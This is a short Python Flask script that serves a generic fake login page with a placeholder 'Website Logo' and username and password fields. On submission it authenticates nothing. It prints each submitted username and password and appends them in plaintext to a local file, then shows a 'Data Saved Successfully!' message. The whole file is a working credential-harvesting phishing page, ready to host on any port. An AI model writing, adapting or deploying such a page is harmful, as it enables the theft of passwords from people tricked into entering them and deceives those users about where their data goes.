import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    return """<form action="/login" method="POST" style="text-align:center;margin-top:50px;">
        <h2>Website Logo</h2>
        <input type="text" name="username" placeholder="Username or Email" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit">Log In</button>
    </form>"""

@app.route("/login", methods=["POST"])
def login():
    u = request.form.get("username")
    p = request.form.get("password")
    print(f"User: {u} | Pass: {p}", flush=True)
    with open("data.txt", "a") as f:
       f.write(f"User: {u} | Pass: {p}\n")
    return "<h1 style=\"color:green;text-align:center;\">Data Saved Successfully!</h1>"
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
